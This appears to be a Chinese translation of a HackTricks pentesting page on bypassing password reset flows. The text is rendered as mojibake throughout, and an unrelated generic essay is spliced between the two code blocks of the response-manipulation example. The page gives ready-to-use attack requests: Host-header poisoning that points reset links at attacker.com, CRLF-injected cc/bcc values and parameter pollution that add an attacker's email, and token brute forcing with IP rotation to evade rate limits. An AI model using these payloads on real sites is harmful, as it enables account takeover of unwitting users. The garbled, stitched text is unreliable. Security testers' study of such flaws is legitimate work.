# é‡ç½®/å¿˜è®°å¯†ç ç»•è¿‡

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofæ˜¯æ‰€æœ‰åŠ å¯†æ¼æ´èµé‡‘çš„å®¶å›­ã€‚**

**æ— éœ€å»¶è¿Ÿè·å¾—å¥–åŠ±**\
HackenProofçš„èµé‡‘åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åæ‰ä¼šå¯åŠ¨ã€‚åœ¨æ¼æ´éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨web3æ¸—é€æµ‹è¯•ä¸­è·å¾—ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼åœ¨å…¶å´›èµ·çš„æ—¥å­é‡ŒæŒæ¡web3å®‰å…¨ã€‚

**æˆä¸ºweb3é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šè·å¾—å£°èª‰ç§¯åˆ†ï¼Œå¹¶å æ®æ¯å‘¨æ’è¡Œæ¦œçš„æ¦œé¦–ã€‚

[**åœ¨HackenProofä¸Šæ³¨å†Œ**](https://hackenproof.com/register)å¼€å§‹ä»æ‚¨çš„é»‘å®¢è¡ŒåŠ¨ä¸­è·åˆ©ï¼

{% embed url="https://hackenproof.com/register" %}

ä»¥ä¸‹æŠ€æœ¯é‡æ–°ç¼–è¯‘è‡ª[https://anugrahsr.github.io/posts/10-Password-reset-flaws/](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)

## é€šè¿‡å¼•ç”¨æ³„æ¼å¯†ç é‡ç½®ä»¤ç‰Œ

**HTTP referer**æ˜¯ä¸€ä¸ªå¯é€‰çš„HTTPå¤´å­—æ®µï¼Œç”¨äºæ ‡è¯†é“¾æ¥åˆ°æ‰€è¯·æ±‚èµ„æºçš„ç½‘é¡µçš„åœ°å€ã€‚å¼•ç”¨è¯·æ±‚å¤´åŒ…å«ä»å½“å‰è¯·æ±‚é¡µé¢è·Ÿè¸ªé“¾æ¥åˆ°å½“å‰è¯·æ±‚é¡µé¢çš„ä¸Šä¸€ä¸ªç½‘é¡µçš„åœ°å€ã€‚

![](https://www.optimizesmart.com/wp-content/uploads/2020/01/1-1-2.jpg)

### åˆ©ç”¨

* å‘æ‚¨çš„ç”µå­é‚®ä»¶åœ°å€è¯·æ±‚é‡ç½®å¯†ç 
* ç‚¹å‡»å¯†ç é‡ç½®é“¾æ¥
* ä¸æ›´æ”¹å¯†ç 
* ç‚¹å‡»ä»»ä½•ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼ˆä¾‹å¦‚ï¼šFacebookï¼ŒTwitterï¼‰
* åœ¨burpsuiteä»£ç†ä¸­æ‹¦æˆªè¯·æ±‚
* æ£€æŸ¥å¼•ç”¨å¤´æ˜¯å¦æ³„æ¼å¯†ç é‡ç½®ä»¤ç‰Œã€‚

### å½±å“

å®ƒå…è®¸æ§åˆ¶ç‰¹å®šç«™ç‚¹çš„äººæ›´æ”¹ç”¨æˆ·çš„å¯†ç ï¼ˆCSRFæ”»å‡»ï¼‰ï¼Œå› ä¸ºæ­¤äººçŸ¥é“ç”¨æˆ·çš„é‡ç½®å¯†ç ä»¤ç‰Œã€‚

### å‚è€ƒï¼š

* https://hackerone.com/reports/342693
* https://hackerone.com/reports/272379
* https://hackerone.com/reports/737042
* https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a
* https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1

## å¯†ç é‡ç½®æ¯’åŒ–

å¦‚æœæ‚¨å‘ç°ä¸»æœºå¤´æ”»å‡»è¶…å‡ºèŒƒå›´ï¼Œè¯·å°è¯•æ‰¾åˆ°å¯†ç é‡ç½®æŒ‰é’®ï¼

![](https://portswigger.net/web-security/images/password-reset-poisoning.svg)

### åˆ©ç”¨

* åœ¨Burpsuiteä¸­æ‹¦æˆªå¯†ç é‡ç½®è¯·æ±‚
* æ·»åŠ ä»¥ä¸‹å¤´éƒ¨æˆ–åœ¨Burpsuiteä¸­ç¼–è¾‘å¤´éƒ¨ï¼ˆé€ä¸ªå°è¯•ï¼‰
```
Host: attacker.com
```

```
Host: target.com
X-Forwarded-Host: attacker.com
```

```
Host: target.com
Host: attacker.com
```
* æ£€æŸ¥ç”µå­é‚®ä»¶ä¸­æ›´æ”¹å¯†ç çš„é“¾æ¥æ˜¯å¦æŒ‡å‘ attacker.com

### ä¿®å¤

ä½¿ç”¨ `$_SERVER['SERVER_NAME']` è€Œä¸æ˜¯ `$_SERVER['HTTP_HOST']`
```php
$resetPasswordURL = "https://{$_SERVER['HTTP_HOST']}/reset-password.php?token=12345678-1234-1234-1234-12345678901";
```
### å½±å“

å—å®³è€…å°†åœ¨å…¶ç”µå­é‚®ä»¶ä¸­æ”¶åˆ°æ¶æ„é“¾æ¥ï¼Œå½“ç‚¹å‡»è¯¥é“¾æ¥æ—¶ï¼Œå°†æ³„éœ²ç”¨æˆ·çš„å¯†ç é‡ç½®é“¾æ¥/ä»¤ç‰Œç»™æ”»å‡»è€…ï¼Œå¯¼è‡´å®Œå…¨æ¥ç®¡è´¦æˆ·ã€‚

### å‚è€ƒï¼š

* https://hackerone.com/reports/226659
* https://hackerone.com/reports/167631
* https://www.acunetix.com/blog/articles/password-reset-poisoning/
* https://pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/
* https://medium.com/@swapmaurya20/password-reset-poisoning-leading-to-account-takeover-f178f5f1de87

## é€šè¿‡æ“çºµç”µå­é‚®ä»¶å‚æ•°è¿›è¡Œå¯†ç é‡ç½®

### æ¼æ´åˆ©ç”¨

* ä½¿ç”¨ & å°†æ”»å‡»è€…çš„ç”µå­é‚®ä»¶æ·»åŠ ä¸ºç¬¬äºŒä¸ªå‚æ•°
```php
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```
* å°†æ”»å‡»è€…çš„ç”µå­é‚®ä»¶ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°æ·»åŠ ï¼Œä½¿ç”¨ %20
```php
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```
* å°†æ”»å‡»è€…çš„ç”µå­é‚®ä»¶ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä½¿ç”¨ |
```php
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```
* å°†æ”»å‡»è€…çš„ç”µå­é‚®ä»¶ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°æ·»åŠ ï¼Œä½¿ç”¨æŠ„é€ï¼ˆccï¼‰
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```
* å°†æ”»å‡»è€…çš„ç”µå­é‚®ä»¶ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°æ·»åŠ ï¼Œå¹¶ä½¿ç”¨å¯†é€ï¼ˆBCCï¼‰åŠŸèƒ½ã€‚
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```
* å°†æ”»å‡»è€…çš„ç”µå­é‚®ä»¶ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°æ·»åŠ ï¼Œä½¿ç”¨é€—å·åˆ†éš”ã€‚
```php
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```
* å°†æ”»å‡»è€…çš„ç”µå­é‚®ä»¶ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°æ·»åŠ åˆ°JSONæ•°ç»„ä¸­
```php
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```
### å‚è€ƒèµ„æ–™

* [https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be](https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be)
* [https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/](https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/)
* [https://twitter.com/HusseiN98D/status/1254888748216655872](https://twitter.com/HusseiN98D/status/1254888748216655872)

## é€šè¿‡ API å‚æ•°æ›´æ”¹ä»»æ„ç”¨æˆ·çš„ç”µå­é‚®ä»¶å’Œå¯†ç 

### æ¼æ´åˆ©ç”¨

* æ”»å‡»è€…å¿…é¡»ä½¿ç”¨è‡ªå·±çš„å¸æˆ·ç™»å½•å¹¶è½¬åˆ°æ›´æ”¹å¯†ç åŠŸèƒ½
* å¯åŠ¨ Burp Suite å¹¶æ‹¦æˆªè¯·æ±‚
* åœ¨æ‹¦æˆªè¯·æ±‚åï¼Œå°†å…¶å‘é€åˆ°é‡å¤å™¨å¹¶ä¿®æ”¹å‚æ•° Email å’Œ Password
```php
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```
### å‚è€ƒèµ„æ–™

* https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240

### æ— é€Ÿç‡é™åˆ¶: é‚®ä»¶è½°ç‚¸ <a href="#5-no-rate-limiting-email-bombing" id="5-no-rate-limiting-email-bombing"></a>

### åˆ©ç”¨

* å¯åŠ¨Burp Suiteå¹¶æ‹¦æˆªå¯†ç é‡ç½®è¯·æ±‚
* å‘é€åˆ°Intruder
* ä½¿ç”¨ç©ºè´Ÿè½½

### å‚è€ƒèµ„æ–™

* https://hackerone.com/reports/280534
* https://hackerone.com/reports/794395

## æŸ¥æ‰¾å¯†ç é‡ç½®ä»¤ç‰Œç”Ÿæˆæ–¹å¼

æ‰¾å‡ºå¯†ç é‡ç½®ä»¤ç‰Œçš„æ¨¡å¼

![](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSvCcLcUTksGbpygrJB4III5BTBYEzYQfKJyg\&usqp=CAU)

å¦‚æœå®ƒæ˜¯

* åŸºäºæ—¶é—´æˆ³ç”Ÿæˆ
* åŸºäºç”¨æˆ·IDç”Ÿæˆ
* åŸºäºç”¨æˆ·ç”µå­é‚®ä»¶ç”Ÿæˆ
* åŸºäºåå­—å’Œå§“æ°ç”Ÿæˆ
* åŸºäºå‡ºç”Ÿæ—¥æœŸç”Ÿæˆ
* åŸºäºå¯†ç å­¦ç”Ÿæˆ

ä½¿ç”¨Burp SequenceræŸ¥æ‰¾ä»¤ç‰Œçš„éšæœºæ€§æˆ–å¯é¢„æµ‹æ€§ã€‚

## å¯çŒœæµ‹çš„GUID

æœ‰ä¸åŒç±»å‹çš„GUIDï¼š

* **ç‰ˆæœ¬0ï¼š**ä»…åœ¨nil GUIDï¼ˆ"00000000-0000-0000-0000-000000000000"ï¼‰ä¸­å¯è§ã€‚
* **ç‰ˆæœ¬1ï¼š**GUIDæ˜¯æ ¹æ®ä»¥ä¸‹æ–¹å¼å¯é¢„æµ‹ç”Ÿæˆçš„ï¼š
* å½“å‰æ—¶é—´
* åœ¨ç”Ÿæˆç³»ç»Ÿçš„æ­£å¸¸è¿è¡Œæ—¶é—´å†…ï¼Œä¿æŒä¸å˜çš„éšæœºç”Ÿæˆçš„â€œæ—¶é’Ÿåºåˆ—â€
* å¦‚æœå¯ç”¨ï¼ŒåŸºäºç³»ç»Ÿçš„MACåœ°å€ç”Ÿæˆçš„â€œèŠ‚ç‚¹IDâ€
* **ç‰ˆæœ¬3ï¼š**GUIDæ˜¯ä½¿ç”¨æä¾›çš„åç§°å’Œå‘½åç©ºé—´çš„MD5å“ˆå¸Œç”Ÿæˆçš„ã€‚
* **ç‰ˆæœ¬4ï¼š**GUIDæ˜¯éšæœºç”Ÿæˆçš„ã€‚
* **ç‰ˆæœ¬5ï¼š**GUIDæ˜¯ä½¿ç”¨æä¾›çš„åç§°å’Œå‘½åç©ºé—´çš„SHA1å“ˆå¸Œç”Ÿæˆçš„ã€‚

å¯ä»¥æŸ¥çœ‹GUIDå¹¶æ‰¾å‡ºå…¶ç‰ˆæœ¬ï¼Œæœ‰ä¸€ä¸ªå°å·¥å…·å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ï¼š[**guidtool**](https://github.com/intruder-io/guidtool)\*\*\*\*
```http
guidtool -i 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c
UUID version: 1
UUID time: 2021-11-17 17:52:18.141000
UUID timestamp: 138564643381410000
UUID node: 17547390002044
UUID MAC address: 0f:f5:91:f2:a3:7c
UUID clock sequence: 3426
```
å¦‚æœç”¨äºç”Ÿæˆé‡ç½®å¯†ç GUIDçš„ç‰ˆæœ¬æ˜¯ç‰ˆæœ¬1ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨æš´åŠ›ç ´è§£æ”»å‡»æ¥ç ´è§£GUIDSï¼š
```http
guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000
a34aca00-47d0-11ec-8d62-0ff591f2a37c
a34af110-47d0-11ec-8d62-0ff591f2a37c
```
### å‚è€ƒèµ„æ–™

* [https://www.intruder.io/research/in-guid-we-trust](https://www.intruder.io/research/in-guid-we-trust)

## å“åº”ç¯¡æ”¹ï¼šç”¨å¥½çš„å“åº”æ›¿æ¢åçš„å“åº”

å¯»æ‰¾ä»¥ä¸‹ç±»å‹çš„è¯·æ±‚å’Œå“åº”
```php
HTTP/1.1 401 Unauthorized
(â€œmessageâ€:â€unsuccessfulâ€,â€statusCode:403,â€errorDescriptionâ€:â€Unsuccessfulâ€)
```
# é‡ç½®å¯†ç 

å½“è¿›è¡Œç½‘ç»œæ¸—é€æµ‹è¯•æ—¶ï¼Œé‡ç½®å¯†ç æ˜¯ä¸€ç§å¸¸è§çš„æ”»å‡»æŠ€æœ¯ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬è·å–ç›®æ ‡ç³»ç»Ÿçš„è®¿é—®æƒé™ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„é‡ç½®å¯†ç æŠ€æœ¯ï¼š

## 1. å¿˜è®°å¯†ç åŠŸèƒ½æ»¥ç”¨

è®¸å¤šç½‘ç«™å’Œåº”ç”¨ç¨‹åºæä¾›äº†â€œå¿˜è®°å¯†ç â€åŠŸèƒ½ï¼Œå…è®¸ç”¨æˆ·é€šè¿‡ç”µå­é‚®ä»¶æˆ–æ‰‹æœºçŸ­ä¿¡é‡ç½®å¯†ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªåŠŸèƒ½æ¥é‡ç½®ç›®æ ‡ç”¨æˆ·çš„å¯†ç ï¼Œä»è€Œè·å–å¯¹å…¶è´¦æˆ·çš„è®¿é—®æƒé™ã€‚

æ”»å‡»è€…å¯ä»¥å°è¯•ä»¥ä¸‹æ–¹æ³•æ¥æ»¥ç”¨å¿˜è®°å¯†ç åŠŸèƒ½ï¼š

- æšä¸¾ç”¨æˆ·åï¼šé€šè¿‡å°è¯•ä¸åŒçš„ç”¨æˆ·åï¼Œæ”»å‡»è€…å¯ä»¥ç¡®å®šå“ªäº›ç”¨æˆ·åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ³¨å†Œäº†è´¦æˆ·ã€‚
- æšä¸¾é‡ç½®å¯†ç é€‰é¡¹ï¼šæ”»å‡»è€…å¯ä»¥å°è¯•ä¸åŒçš„é‡ç½®å¯†ç é€‰é¡¹ï¼Œä¾‹å¦‚é€šè¿‡ç”µå­é‚®ä»¶æˆ–æ‰‹æœºçŸ­ä¿¡é‡ç½®å¯†ç ã€‚
- ç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡æ¬ºéª—ç›®æ ‡ç”¨æˆ·æä¾›å…¶ä¸ªäººä¿¡æ¯ï¼Œä¾‹å¦‚å‡ºç”Ÿæ—¥æœŸã€ä½å€ç­‰ï¼Œä»è€ŒæˆåŠŸé‡ç½®å¯†ç ã€‚

## 2. å¼±å¯†ç é‡ç½®

æœ‰äº›ç½‘ç«™å’Œåº”ç”¨ç¨‹åºåœ¨é‡ç½®å¯†ç æ—¶å¯èƒ½ä¼šä½¿ç”¨å¼±å¯†ç é‡ç½®æœºåˆ¶ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´æ¥é‡ç½®ç›®æ ‡ç”¨æˆ·çš„å¯†ç ã€‚

æ”»å‡»è€…å¯ä»¥å°è¯•ä»¥ä¸‹æ–¹æ³•æ¥åˆ©ç”¨å¼±å¯†ç é‡ç½®æ¼æ´ï¼š

- æšä¸¾é‡ç½®å¯†ç é“¾æ¥ï¼šæ”»å‡»è€…å¯ä»¥å°è¯•é€šè¿‡æšä¸¾ä¸åŒçš„é‡ç½®å¯†ç é“¾æ¥æ¥æ‰¾åˆ°æœ‰æ•ˆçš„é“¾æ¥ã€‚
- é¢„æµ‹é‡ç½®å¯†ç é“¾æ¥ï¼šæ”»å‡»è€…å¯ä»¥å°è¯•é¢„æµ‹é‡ç½®å¯†ç é“¾æ¥çš„æ ¼å¼ï¼Œä¾‹å¦‚ä½¿ç”¨å¸¸è§çš„å‘½åçº¦å®šæˆ–æ¨¡å¼ã€‚
- æš´åŠ›ç ´è§£é‡ç½®å¯†ç é“¾æ¥ï¼šæ”»å‡»è€…å¯ä»¥ä½¿ç”¨æš´åŠ›ç ´è§£å·¥å…·æ¥å°è¯•çŒœæµ‹æœ‰æ•ˆçš„é‡ç½®å¯†ç é“¾æ¥ã€‚

## 3. ä¼šè¯åŠ«æŒ

ä¼šè¯åŠ«æŒæ˜¯ä¸€ç§æ”»å‡»æŠ€æœ¯ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è·å–ç›®æ ‡ç”¨æˆ·çš„ä¼šè¯ä»¤ç‰Œæ¥é‡ç½®å…¶å¯†ç ã€‚

æ”»å‡»è€…å¯ä»¥å°è¯•ä»¥ä¸‹æ–¹æ³•æ¥è¿›è¡Œä¼šè¯åŠ«æŒï¼š

- çªƒå–ä¼šè¯ä»¤ç‰Œï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡çªƒå–ç›®æ ‡ç”¨æˆ·çš„ä¼šè¯ä»¤ç‰Œæ¥è·å–å¯¹å…¶è´¦æˆ·çš„è®¿é—®æƒé™ã€‚
- é‡æ”¾æ”»å‡»ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡é‡æ”¾å…ˆå‰æ•è·çš„ä¼šè¯ä»¤ç‰Œæ¥é‡ç½®ç›®æ ‡ç”¨æˆ·çš„å¯†ç ã€‚

## 4. æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºæ¼æ´

æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºä¸­çš„æ¼æ´å¯èƒ½ä¼šå¯¼è‡´é‡ç½®å¯†ç çš„å®‰å…¨é—®é¢˜ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´æ¥é‡ç½®ç›®æ ‡ç”¨æˆ·çš„å¯†ç ã€‚

æ”»å‡»è€…å¯ä»¥å°è¯•ä»¥ä¸‹æ–¹æ³•æ¥åˆ©ç”¨æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºæ¼æ´ï¼š

- åˆ©ç”¨å·²çŸ¥æ¼æ´ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å·²çŸ¥çš„æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºæ¼æ´æ¥è·å–å¯¹ç›®æ ‡ç³»ç»Ÿçš„è®¿é—®æƒé™ã€‚
- å¯†ç é‡ç½®ä»¤ç‰Œæ³„éœ²ï¼šæŸäº›æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºå¯èƒ½ä¼šå°†å¯†ç é‡ç½®ä»¤ç‰Œå­˜å‚¨åœ¨ä¸å®‰å…¨çš„ä½ç½®ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ³„éœ²çš„ä»¤ç‰Œæ¥é‡ç½®å¯†ç ã€‚

ä»¥ä¸Šæ˜¯ä¸€äº›å¸¸è§çš„é‡ç½®å¯†ç æŠ€æœ¯ï¼Œæ¸—é€æµ‹è¯•äººå‘˜å¯ä»¥åˆ©ç”¨è¿™äº›æŠ€æœ¯æ¥è¯„ä¼°ç›®æ ‡ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œå¹¶æä¾›ç›¸åº”çš„å»ºè®®å’Œè§£å†³æ–¹æ¡ˆæ¥ä¿®å¤æ½œåœ¨çš„æ¼æ´ã€‚
```php
HTTP/1.1 200 OK
(â€œmessageâ€:â€successâ€,â€statusCode:200,â€errorDescriptionâ€:â€Successâ€)
```
### å‚è€ƒ

* https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3

### ä½¿ç”¨è¿‡æœŸçš„ä»¤ç‰Œ <a href="#8-using-expired-token" id="8-using-expired-token"></a>

* æ£€æŸ¥è¿‡æœŸçš„ä»¤ç‰Œæ˜¯å¦å¯ä»¥é‡ç”¨

### æš´åŠ›ç ´è§£å¯†ç é‡ç½®ä»¤ç‰Œ <a href="#9-brute-force-password-rest-token" id="9-brute-force-password-rest-token"></a>

å°è¯•ä½¿ç”¨Burpsuiteæš´åŠ›ç ´è§£é‡ç½®ä»¤ç‰Œ
```php
POST /resetPassword
[...]
email=victim@email.com&code=$BRUTE$
```
* ä½¿ç”¨Burp Suiteä¸Šçš„IP-Rotatorç»•è¿‡åŸºäºIPçš„é€Ÿç‡é™åˆ¶ã€‚

### å‚è€ƒèµ„æ–™

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

### å°è¯•ä½¿ç”¨æ‚¨çš„ä»¤ç‰Œ <a href="#10-try-using-your-token" id="10-try-using-your-token"></a>

* å°è¯•å°†æ‚¨çš„å¯†ç é‡ç½®ä»¤ç‰Œæ·»åŠ åˆ°å—å®³è€…çš„è´¦æˆ·ä¸­ã€‚
```php
POST /resetPassword
[...]
email=victim@email.com&code=$YOUR_TOKEN$
```
### å‚è€ƒ

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

## æ³¨é”€/é‡ç½®å¯†ç ä¸­çš„ä¼šè¯å¤±æ•ˆ

å½“ç”¨æˆ·æ³¨é”€æˆ–é‡ç½®å¯†ç æ—¶ï¼Œå½“å‰ä¼šè¯åº”è¯¥è¢«ä½¿æ— æ•ˆã€‚\
å› æ­¤ï¼Œåœ¨ç”¨æˆ·ç™»å½•æ—¶ï¼Œè·å–**cookies**ï¼Œç„¶åè¿›è¡Œ**æ³¨é”€**ï¼Œå¹¶**æ£€æŸ¥**æ˜¯å¦**cookies**ä»ç„¶æœ‰æ•ˆã€‚\
é‡å¤æ­¤è¿‡ç¨‹ï¼Œæ”¹ä¸º**æ›´æ”¹å¯†ç **è€Œä¸æ˜¯æ³¨é”€ã€‚

## é‡ç½®ä»¤ç‰Œè¿‡æœŸæ—¶é—´

**é‡ç½®ä»¤ç‰Œå¿…é¡»æœ‰ä¸€ä¸ªè¿‡æœŸæ—¶é—´**ï¼Œåœ¨æ­¤ä¹‹åï¼Œä»¤ç‰Œä¸åº”è¯¥æœ‰æ•ˆæ¥æ›´æ”¹ç”¨æˆ·çš„å¯†ç ã€‚

## é¢å¤–æ£€æŸ¥

* ä½¿ç”¨username@burp\_collab.netå¹¶åˆ†æå›è°ƒ
* ä½¿ç”¨carbon copy email=victim@mail.com%0a%0dcc:hacker@mail.com
* é•¿å¯†ç ï¼ˆ>200ï¼‰ä¼šå¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰
* æ·»åŠ ç¬¬äºŒä¸ªç”µå­é‚®ä»¶å‚æ•°å’Œå€¼

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofæ˜¯æ‰€æœ‰åŠ å¯†æ¼æ´èµé‡‘çš„å®¶å›­ã€‚**

**å³åˆ»è·å¾—å¥–åŠ±**\
HackenProofçš„èµé‡‘åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åæ‰ä¼šå¯åŠ¨ã€‚åœ¨æ¼æ´éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨web3æ¸—é€æµ‹è¯•ä¸­è·å¾—ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼æŒæ¡web3å®‰å…¨çš„å´›èµ·ä¹‹æ—¥ã€‚

**æˆä¸ºweb3é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šè·å¾—å£°æœ›ç§¯åˆ†ï¼Œå¹¶å æ®æ¯å‘¨æ’è¡Œæ¦œçš„æ¦œé¦–ã€‚

[**åœ¨HackenProofä¸Šæ³¨å†Œ**](https://hackenproof.com/register) å¼€å§‹ä»æ‚¨çš„é»‘å®¢æ”»å‡»ä¸­è·åˆ©ï¼

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šå—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
